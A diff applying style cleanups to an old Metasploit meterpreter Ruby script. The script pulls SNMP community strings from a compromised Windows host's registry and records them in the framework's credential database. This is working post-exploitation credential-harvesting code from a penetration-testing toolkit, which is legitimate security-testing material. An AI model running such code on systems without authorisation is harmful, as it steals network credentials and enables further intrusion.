@@ -1,11 +1,11 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
-
-#copied getvncpw - thanks grutz/carlos
+# copied getvncpw - thanks grutz/carlos
 
 session = client
 
@@ -13,7 +13,7 @@ session = client
   "-h" => [ false, "Help menu."]
 )
 
-def usage()
+def usage
   print("\nPull the SNMP community string from a Windows Meterpreter session\n\n")
   completed
 end
@@ -21,22 +21,22 @@ end
 def get_community(session)
   key = "HKLM\\System\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities"
   root_key, base_key = session.sys.registry.splitkey(key)
-  open_key = session.sys.registry.open_key(root_key,base_key,KEY_READ)
+  open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
   begin
     # oddly enough this does not return the data field which indicates ro/rw
-    return open_key.enum_value.collect {|x| x.name}
+    return open_key.enum_value.collect(&:name)
   rescue
     # no registry key found or other error
     return nil
   end
 end
 
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, _val|
   case opt
   when "-h"
     usage
   end
-}
+end
 
 if client.platform =~ /win32|win64/
   print_status("Searching for community strings...")
@@ -45,14 +45,14 @@ if client.platform =~ /win32|win64/
     strs.each do |str|
       print_good("FOUND: #{str}")
       @client.framework.db.report_auth_info(
-        :host	=> client.sock.peerhost,
-        :port	=> 161,
-        :proto	=> 'udp',
-        :sname	=> 'snmp',
-        :user	=> '',
-        :pass	=> str,
-        :type	=> "snmp.community",
-        :duplicate_ok	=> true
+        host: client.sock.peerhost,
+        port: 161,
+        proto: 'udp',
+        sname: 'snmp',
+        user: '',
+        pass: str,
+        type: "snmp.community",
+        duplicate_ok: true
       )
     end
   else
